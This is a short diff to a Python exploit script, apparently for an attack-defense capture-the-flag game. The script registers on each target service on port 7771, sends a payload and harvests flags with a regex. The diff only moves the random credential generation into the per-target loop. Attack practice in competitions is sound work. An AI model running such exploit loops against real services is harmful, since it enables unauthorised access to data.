@@ -65,12 +65,6 @@ def exploit(io: remote, family_name: str):
     resp: str = io.recv(1000).decode()
     print(regex.findall(resp), flush=True)
 
-
-rnd_username = random_chars()
-rnd_password = random_chars()
-rnd_secret = random_chars()
-
-
 PORT = 7771
 ip = sys.argv[1]
 forcad_host = "10.10.10.10"
@@ -85,12 +79,16 @@ attack_data = get_attack_data()["minions"][ip]
 for data in attack_data:
     data = json.loads(data)
 
+    rnd_username = random_chars()
+    rnd_password = random_chars()
+    rnd_secret = random_chars()
+    
     io = remote(ip, PORT)
 
     register(io, rnd_username, rnd_password, rnd_secret)
     login(io, rnd_username, rnd_password)
 
-    create_family(io, rnd_username, rnd_password)
+    create_family(io, random_chars(), random_chars())
     get_minion_info(io, payload)
 
     exploit(io, data["family_name"])
